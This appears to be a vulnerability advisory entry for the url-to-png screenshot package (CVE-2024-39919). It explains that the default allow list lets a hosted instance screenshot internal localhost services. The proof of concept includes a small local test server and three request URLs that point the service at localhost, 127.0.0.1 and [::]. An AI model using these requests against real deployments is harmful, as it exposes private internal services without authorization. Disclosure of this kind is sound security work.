  - CVE-2024-39919
summary: "@jmondi/url-to-png enables capture screenshot of localhost web services (unauthenticated\
  \ pages)\n### Summary\n\nThe maintainer been contemplating whether FTP or other protocols\
  \ could serve as useful functionalities, but there may not be a practical reason for it since\
  \ we are utilizing headless Chrome to capture screenshots. The argument is based on the assumption\
  \ that this package can function as a service.\n\nThe package includes an `ALLOW_LIST` where\
  \ the host can specify which services the user is permitted to capture screenshots of. By\
  \ default, capturing screenshots of web services running on localhost, 127.0.0.1, or the [::]\
  \ is allowed.\n\nThe maintainer is of the opinion that the package should also have a blacklist\
  \ due to a potential vulnerability (or rather design oversight). If someone hosts this on\
  \ a server, users could then capture screenshots of other web services running locally.\n\n\
  Unless this is strictly for web pages. Something similar here: https://github.com/follow-redirects/follow-redirects/issues/235\
  \ (localhost is intended for end users or hosts to deny, and the package is for HTTP/HTTPS.)\n\
  \nThis is marked as a `LOW` since the maintainer is not sure if this is a vulnerability, but\
  \ it's still best to highlight it. :) \n\n### PoC\n\nHave a service like so running locally:\n\
  \n```js\nconst http = require(\"http\")\n\nconst server = http.createServer((req, res) =>\
  \ {\n  console.log(\"Received headers:\", req.headers)\n  res.writeHead(200, { \"Content-Type\"\
  : \"text/plain\" })\n  res.end(\"Something private! But Hello from Server 2 :)\")\n})\n\n\
  server.listen(3001, () => {\n  console.log(\"Server two running on http://localhost:3001\"\
  )\n})\n```\n\nRun the package in dev mode, `pnpm dev`. Feed these URLs:\n\n```\nhttp://localhost:3089/?url=http://[::]:3001&width=4000\n\
  http://localhost:3089/?url=http://localhost:3001&width=4000\nhttp://localhost:3089/?url=http://127.0.01:3001&width=4000\n\
  ```\n\n<img width=\"622\" alt=\"image\" src=\"https://github.com/jasonraimondi/url-to-png/assets/42532003/21f1c883-ba00-4a15-83b8-922484fa4c2b\"\
  >\n\n\n\n### Impact\nDisclose internal web services?"
